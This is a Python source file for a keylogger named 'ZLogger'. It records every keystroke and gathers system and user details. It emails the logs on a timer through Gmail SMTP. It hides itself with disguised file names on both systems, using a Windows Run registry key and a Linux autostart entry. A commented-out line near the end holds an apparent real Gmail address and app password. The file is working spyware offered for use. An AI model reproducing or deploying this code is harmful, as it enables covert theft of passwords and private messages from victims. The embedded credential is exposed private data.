#!/usr/bin/env python
import pynput.keyboard
import threading
import smtplib
import os
import shutil
import subprocess
import sys
import stat
import platform
import getpass


# import requests as req
# import socket


class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = ""
        self.interval = time_interval
        self.email = email
        self.password = password
        self.system_info = self.get_system_info()

    # ==========================APPENDING KEYSTROKES LOG TO A VARIABLE================================

    def append_to_log(self, string):
        self.log = self.log + string

    '''def get_public_ip_detail(self):
        url: str = 'https://checkip.amazonaws.com'
        request = req.get(url)
        return request.text
    def get_pc_ip(self):
        hostname = socket.gethostname()
        myip = socket.gethostbyname(hostname)
        return myip'''

    # ==========================GETTING TARGET MACHINE INFORMATION===========================

    def get_system_info(self):
        # per_ip = self.get_pc_ip()
        # pub_ip = self.get_pubip_detail()
        uname = platform.uname()
        os = uname[0] + " " + uname[2] + " " + uname[3]
        computer_name = uname[1]
        user = getpass.getuser()
        return "Operating System:\t" + os + "\nComputer Name:\t\t" + computer_name + "\nUser:\t\t\t\t" + user  # + "\nPublic IP:\t\t" + pub_ip  '\nPersonal IP:\t\t' + per_ip

    # ========================CAPTURING KEYSTROKES AND APPENDING==================================

    def process_key_press(self, key):
        try:
            current_key = str(key.char)

        except AttributeError:
            if key == key.space:
                current_key = " "

            else:
                current_key = " " + str(key) + " "

        self.append_to_log(current_key)

    # =======================REPORTING THE RECORDED LOG==========================

    def report(self):
        self.send_mail(self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    # =====================MAIN FUNCTION FOR SENDING THE EMAIL========================

    def send_mail(self, message):

        message = "Subject: ZLogger Report\n\n" + "Report From:\n\n" + self.system_info + "\n\nLogs:\n" + message
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(self.email, self.password)
        server.sendmail(self.email, self.email, message)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

    # ======================CHECKING THE OS TO GAIN PREVILAGE======================

    def become_persistent(self):

        if sys.platform.startswith("win"):
            self.become_persistent_on_windows()

        elif sys.platform.startswith("linux"):
            self.become_persistent_on_linux()

    # ====================GAINING PREVILAGE IN WINDOWS===========================

    def become_persistent_on_windows(self):

        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"

        if not os.path.exists(evil_file_location):
            self.log = "** Keylogger started ** "
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call(
                'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v winexplorer /t REG_SZ /d "' + evil_file_location + '"',
                shell=True)

    # ====================GAINING PREVILAGE IN LINUX===========================

    def become_persistent_on_linux(self):

        home_config_directory = os.path.expanduser('~') + "/.config/"
        autostart_path = home_config_directory + "/autostart/"
        autostart_file = autostart_path + "xinput.desktop"

        if not os.path.isfile(autostart_file):
            self.log = "** Keylogger started **"
            try:
                os.makedirs(autostart_path)

            except OSError:
                pass

            destination_file = home_config_directory + "xnput"
            shutil.copyfile(sys.executable, destination_file)
            self.chmod_to_exec(destination_file)

            with open(autostart_file, 'w') as out:

                out.write("[Desktop Entry]\nType=Application\nX-GNOME-Autostart-enabled=true\n")
                out.write("Name=Xinput\nExec=" + destination_file + "\n")

            self.chmod_to_exec(autostart_file)
            subprocess.Popen(destination_file)
            sys.exit()

    def chmod_to_exec(self, file):
        os.chmod(file, os.stat(file).st_mode | stat.S_IEXEC)

# k = Keylogger(120, "sumitmouryaaa@gmail.com", "qusrztqrxqzsxzav")
# k.become_persistent()
# k.start()
